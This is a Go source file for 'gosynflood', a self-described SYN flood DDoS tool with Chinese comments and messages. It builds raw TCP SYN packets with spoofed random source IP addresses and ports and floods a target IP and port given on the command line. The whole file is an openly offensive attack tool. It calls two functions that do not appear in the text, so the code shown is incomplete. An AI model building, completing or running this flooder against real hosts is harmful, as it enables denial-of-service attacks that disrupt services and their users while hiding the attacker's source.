package main

/*
	rootVIII gosynflood - synflood DDOS tool
	2020
*/

import (
	"crypto/rand"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"os/user"
	"reflect"
	"strconv"
	"strings"
	"syscall"
)

// SYNPacket represents a TCP packet.
type SYNPacket struct {
	Payload   []byte
	TCPLength uint16
	Adapter   string
}

func (s *SYNPacket) randByte() byte {
	randomUINT8 := make([]byte, 1)
	rand.Read(randomUINT8)
	return randomUINT8[0]
}

func (s *SYNPacket) invalidFirstOctet(val byte) bool {
	return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s *SYNPacket) leftshiftor(lval uint8, rval uint8) uint32 {
	return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

// TCPIP represents the IP header and TCP segment in a TCP packet.
type TCPIP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	SYNPacket     `key:"SYNPacket"`
}

func (tcp *TCPIP) calcTCPChecksum() {
	var checksum uint32 = 0
	checksum = tcp.leftshiftor(tcp.SRC[0], tcp.SRC[1]) +
		tcp.leftshiftor(tcp.SRC[2], tcp.SRC[3])
	checksum += tcp.leftshiftor(tcp.DST[0], tcp.DST[1]) +
		tcp.leftshiftor(tcp.DST[2], tcp.DST[3])
	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPLength)
	checksum += uint32(tcp.Offset)
	checksum += uint32(tcp.Window)

	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func (tcp *TCPIP) setPacket() {
	tcp.TCPLength = 0x0028
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	tcp.TotalLen = 0x003C
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40
	tcp.Protocol = 0x06
	tcp.IPChecksum = 0x0000
	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = tcp.Sequence
	tcp.Offset = 0xA002
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
	tcp.Options = make([]byte, 20)
	tcp.calcTCPChecksum()
}

func (tcp *TCPIP) setTarget(ipAddr string, port uint16) {
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.DST = append(tcp.DST, (uint8)(val))
	}
	tcp.DstPort = port
}

func (tcp *TCPIP) genIP() {
	firstOct := tcp.randByte()
	for tcp.invalidFirstOctet(firstOct) {
		firstOct = tcp.randByte()
	}

	tcp.SRC = []byte{firstOct, tcp.randByte(), tcp.randByte(), tcp.randByte()}
	tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	for tcp.SrcPort <= 0x03FF {
		tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	}
}

func exitErr(reason error) {
	fmt.Println(reason)
	os.Exit(1)
}

func main() {
	// 设置信号处理，优雅退出
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\n攻击已停止。按Ctrl-C退出程序。")
		os.Exit(0)
	}()

	// 检查root权限
	username, err := user.Current()
	if err != nil || username.Name != "root" {
		exitErr(fmt.Errorf("需要root权限来执行此程序"))
	}

	// 解析命令行参数
	target := flag.String("t", "", "目标IPV4地址")
	tport := flag.Uint("p", 0x0050, "目标端口 (默认: 80)")
	ifaceName := flag.String("i", "", "网络接口")
	flag.Parse()

	// 验证命令行参数
	if len(*target) < 1 || net.ParseIP(*target) == nil {
		exitErr(fmt.Errorf("必需参数: -t <目标IP地址>"))
	}
	if strings.Count(*target, ".") != 3 || strings.Contains(*target, ":") {
		exitErr(fmt.Errorf("无效的IPV4地址: %s", *target))
	}
	if *tport > 0xFFFF {
		exitErr(fmt.Errorf("无效的端口号: %d", *tport))
	}

	var packet = &TCPIP{}

	// 获取并验证网络接口
	var foundIface bool = false
	foundIfaces := packet.getInterfaces()
	
	if len(foundIfaces) == 0 {
		exitErr(fmt.Errorf("未能检测到网络接口"))
	}
	
	for _, name := range foundIfaces {
		if name != *ifaceName {
			continue
		}
		foundIface = true
	}

	if !foundIface {
		msg := "无效的网络接口参数 -i <%s>\n可用的网络接口: %s"
		errmsg := fmt.Errorf(msg, *ifaceName, strings.Join(foundIfaces, ", "))
		exitErr(errmsg)
	}

	// 设置错误恢复
	defer func() {
		if err := recover(); err != nil {
			exitErr(fmt.Errorf("错误: %v", err))
		}
	}()

	// 显示攻击信息
	fmt.Printf("开始对 %s:%d 通过接口 %s 进行SYN洪水攻击\n", *target, *tport, *ifaceName)
	fmt.Println("按Ctrl-C停止攻击")
	
	// 设置攻击参数
	packet.Adapter = *ifaceName
	packet.setTarget(*target, uint16(*tport))
	packet.genIP()
	packet.setPacket()

	// 开始攻击
	packet.floodTarget(
		reflect.TypeOf(packet).Elem(),
		reflect.ValueOf(packet).Elem(),
	)
}
